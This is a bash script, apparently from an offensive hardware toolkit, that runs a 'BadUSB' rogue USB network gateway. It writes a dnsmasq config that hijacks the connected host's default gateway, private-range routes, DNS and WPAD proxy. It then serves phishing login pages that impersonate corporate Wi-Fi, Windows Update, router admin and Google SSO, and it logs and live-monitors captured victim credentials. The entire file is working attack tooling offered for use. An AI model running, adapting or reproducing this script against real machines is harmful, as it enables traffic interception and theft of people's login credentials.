#!/usr/bin/env bash
#
# hard-tools: usb_gadget/badusb.sh
# BadUSB Advanced Rogue Gateway, Aggressive DHCP Hijacker & Captive Portal
# Features RFC Option 3/6/121/249 route overrides, wildcard DNS, and multi-template captive portals.
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
LIB_DIR="${ROOT_DIR}/lib"
source "${LIB_DIR}/utils.sh"

FUNC_NAME="rndis.rndis"
IFACE_IP="192.168.42.1"
DHCP_START="192.168.42.100"
DHCP_END="192.168.42.200"

PID_DNSMASQ="/tmp/badusb_dnsmasq.pid"
PID_PORTAL="/tmp/badusb_portal.pid"
CONF_FILE="/tmp/badusb_dnsmasq.conf"
LOG_CREDS="/tmp/badusb_credentials.log"
JSON_LOG="/tmp/badusb_credentials.json"
PORTAL_SCRIPT="${LIB_DIR}/rogue_portal.py"

CURRENT_TEMPLATE="corporate_wifi"

detect_iface() {
    for iface in rndis0 usb0 usb1; do
        if ip link show "$iface" >/dev/null 2>&1; then
            echo "$iface"
            return 0
        fi
    done
    echo "rndis0"
}

start_rogue_services() {
    local iface="$1"
    local tmpl="${2:-$CURRENT_TEMPLATE}"
    stop_rogue_services

    log_info "Configuring network interface ${iface} -> ${IFACE_IP}/24..."
    sudo ip link set "${iface}" up 2>/dev/null || true
    sudo ip addr flush dev "${iface}" 2>/dev/null || true
    sudo ip addr add "${IFACE_IP}/24" dev "${iface}" 2>/dev/null || true

    log_info "Configuring Aggressive DHCP Hijack & Wildcard DNS..."
    # RFC DHCP Options:
    # 3: Default Gateway (0.0.0.0/0 route hijack)
    # 6: DNS Server (points to phone)
    # 121 / 249: Classless Static Routes (routes 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 via 192.168.42.1)
    # 252: WPAD Proxy Auto-Discovery URL
    cat << DCOF | sudo tee "${CONF_FILE}" >/dev/null
interface=${iface}
except-interface=lo
bind-interfaces
listen-address=${IFACE_IP}
dhcp-range=${DHCP_START},${DHCP_END},12h
dhcp-option=3,${IFACE_IP}
dhcp-option=6,${IFACE_IP}
dhcp-option=121,10.0.0.0/8,${IFACE_IP},172.16.0.0/12,${IFACE_IP},192.168.0.0/16,${IFACE_IP}
dhcp-option=249,10.0.0.0/8,${IFACE_IP},172.16.0.0/12,${IFACE_IP},192.168.0.0/16,${IFACE_IP}
dhcp-option=252,"http://${IFACE_IP}/wpad.dat"
address=/#/${IFACE_IP}
pid-file=${PID_DNSMASQ}
log-facility=/tmp/badusb_dnsmasq.log
DCOF

    sudo dnsmasq -C "${CONF_FILE}"
    log_success "Aggressive Rogue DNS & DHCP server started."

    log_info "Starting Captive Portal Web Server on port 80 [Template: ${tmpl}]..."
    sudo python3 "${PORTAL_SCRIPT}" 80 --template "${tmpl}" >/dev/null 2>&1 &
    echo $! | sudo tee "${PID_PORTAL}" >/dev/null
    log_success "Captive portal running (PID $(sudo cat "${PID_PORTAL}"))."
}

stop_rogue_services() {
    sudo pkill -9 dnsmasq 2>/dev/null || true
    sudo rm -f "${PID_DNSMASQ}" "${CONF_FILE}" /tmp/rndis_dnsmasq.pid /tmp/rndis_dnsmasq.conf 2>/dev/null || true

    if [[ -f "${PID_PORTAL}" ]]; then
        local ppid
        ppid=$(sudo cat "${PID_PORTAL}" 2>/dev/null || true)
        if [[ -n "${ppid}" ]] && kill -0 "${ppid}" 2>/dev/null; then
            sudo kill "${ppid}" 2>/dev/null || true
        fi
        sudo rm -f "${PID_PORTAL}" 2>/dev/null || true
    fi
    sudo pkill -f "python3.*rogue_portal" 2>/dev/null || true
}

start() {
    local tmpl="${1:-$CURRENT_TEMPLATE}"
    print_header "Starting BadUSB Advanced Rogue Gateway [Template: ${tmpl}]"
    unbind_udc
    link_function "${FUNC_NAME}" "${FUNC_NAME}"
    bind_udc

    sleep 1
    local iface
    iface=$(detect_iface)
    start_rogue_services "${iface}" "${tmpl}"
    log_success "BadUSB Rogue Gateway is ACTIVE."
}

stop() {
    print_header "Stopping BadUSB Rogue Gateway"
    local iface
    iface=$(detect_iface)
    stop_rogue_services

    sudo ip link set "${iface}" down 2>/dev/null || true
    sudo ip addr flush dev "${iface}" 2>/dev/null || true

    unbind_udc
    unlink_function "${FUNC_NAME}"

    local remaining
    remaining=$(list_active_functions)
    if [[ -n "${remaining}" ]]; then
        bind_udc
    fi
    log_success "BadUSB stopped."
}

status() {
    print_header "BadUSB Rogue Gateway Status"
    local linked="No"
    if is_function_linked "${FUNC_NAME}"; then
        linked="Yes (Active)"
    fi
    local udc
    udc=$(get_udc)
    local iface
    iface=$(detect_iface)

    local dns_status="Inactive"
    if [[ -f "${PID_DNSMASQ}" ]] && kill -0 "$(sudo cat "${PID_DNSMASQ}" 2>/dev/null || echo 0)" 2>/dev/null; then
        dns_status="Active (Aggressive Route Override + Wildcard DNS)"
    fi

    local portal_status="Inactive"
    if [[ -f "${PID_PORTAL}" ]] && kill -0 "$(sudo cat "${PID_PORTAL}" 2>/dev/null || echo 0)" 2>/dev/null; then
        portal_status="Active (Port 80 HTTP / WPAD Responder)"
    fi

    echo -e "Function:            ${COLOR_CYAN}${FUNC_NAME}${COLOR_RESET}"
    echo -e "Linked:              ${linked}"
    echo -e "Active UDC:          ${udc:-<unbound>}"
    echo -e "Network Interface:   ${iface}"
    echo -e "Gateway IP:          ${IFACE_IP}"
    echo -e "Active Template:     ${COLOR_MAGENTA}${CURRENT_TEMPLATE}${COLOR_RESET}"
    echo -e "Rogue DHCP & DNS:    ${dns_status}"
    echo -e "Captive Portal:      ${portal_status}"
    echo
}

view_credentials() {
    print_header "Captured Credentials & HTTP Logs"
    if [[ -f "${LOG_CREDS}" && -s "${LOG_CREDS}" ]]; then
        grep "CREDENTIALS:" "${LOG_CREDS}" || cat "${LOG_CREDS}"
    else
        echo "  (No captured credentials yet)"
    fi
    echo
}

live_monitor() {
    print_header "Live Credential Interception Monitor"
    touch "${LOG_CREDS}"
    echo "Listening for victim logins... (Press Ctrl+C to stop)"
    tail -f "${LOG_CREDS}"
}

select_template_menu() {
    print_header "Select Captive Portal Theme / Phishing Template"
    echo " 1) corporate_wifi   (Corporate Wi-Fi / 802.1X Domain Login)"
    echo " 2) windows_update   (Windows Defender & Policy Update Login)"
    echo " 3) router_admin     (Router & Gateway Administration Console)"
    echo " 4) google_sso       (Google Workspace SSO Login)"
    echo " 5) generic_hotspot  (Public Wi-Fi Hotspot Login)"
    echo
    read -rp "Select Template [1-5]: " topt
    case "$topt" in
        1) CURRENT_TEMPLATE="corporate_wifi" ;;
        2) CURRENT_TEMPLATE="windows_update" ;;
        3) CURRENT_TEMPLATE="router_admin" ;;
        4) CURRENT_TEMPLATE="google_sso" ;;
        5) CURRENT_TEMPLATE="generic_hotspot" ;;
        *) log_warn "Invalid selection. Keeping ${CURRENT_TEMPLATE}" ;;
    esac
    log_success "Active template set to: ${CURRENT_TEMPLATE}"
}

menu() {
    while true; do
        print_header "BadUSB Rogue Gateway & Captive Portal Manager"
        status
        echo " 1) Start BadUSB (Gateway + Aggressive DHCP + Portal)"
        echo " 2) Stop BadUSB"
        echo " 3) Select Portal Phishing Template [Current: ${CURRENT_TEMPLATE}]"
        echo " 4) View Captured Credentials"
        echo " 5) Live Credential Monitor"
        echo " 0) Back to Main Menu"
        echo
        read -rp "Choice: " choice
        case "$choice" in
            1) start "${CURRENT_TEMPLATE}"; press_enter ;;
            2) stop; press_enter ;;
            3) select_template_menu; press_enter ;;
            4) view_credentials; press_enter ;;
            5) live_monitor ;;
            0) break ;;
            *) c_red "Invalid option."; sleep 1 ;;
        esac
    done
}

case "${1:-}" in
    start)   start "${2:-$CURRENT_TEMPLATE}" ;;
    stop)    stop ;;
    status)  status ;;
    creds)   view_credentials ;;
    monitor) live_monitor ;;
    menu|"") menu ;;
    *) echo "Usage: $0 {start [template]|stop|status|creds|monitor|menu}" ;;
esac
